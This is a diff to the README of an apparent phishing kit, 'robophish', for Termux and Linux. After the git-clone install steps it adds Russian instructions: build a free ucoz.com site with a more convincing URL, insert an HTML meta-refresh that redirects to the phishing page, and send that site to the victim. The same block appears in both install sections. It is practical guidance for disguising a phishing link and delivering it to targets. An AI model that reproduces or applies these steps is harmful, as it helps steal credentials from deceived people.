@@ -21,12 +21,36 @@ pkg update
 pkg upgrade
 apt install curl git php -y
 git clone https://github.com/gasayminajj/robophish
+Дальше все интуитивно понятно, нажимаем по ссылке(она оч некрасивая, нужно с ней что-то делать)
+Идем на сайт www.ucoz.com(не реклама) и создаем пустой сайт, главное выбрать более менее красивый url.
+Заходим в HTML редатор.
+Добавляем туда скрипт на переадресацию на наш сайт
+
+HTML:
+
+<head>
+<meta http-equiv="refresh" content="1;URL=ссылка" />
+</head>
+
+Скидываем сайт жертве.
 ```
 ## Linux Install:
 ```
 apt update & apt upgrade
 apt install curl git php -y
 git clone https://github.com/gasayminajj/robophish
+Дальше все интуитивно понятно, нажимаем по ссылке(она оч некрасивая, нужно с ней что-то делать)
+Идем на сайт www.ucoz.com(не реклама) и создаем пустой сайт, главное выбрать более менее красивый url.
+Заходим в HTML редатор.
+Добавляем туда скрипт на переадресацию на наш сайт
+
+HTML:
+
+<head>
+<meta http-equiv="refresh" content="1;URL=ссылка" />
+</head>
+
+Скидываем сайт жертве.
 ```
 ### Использование:
 ```
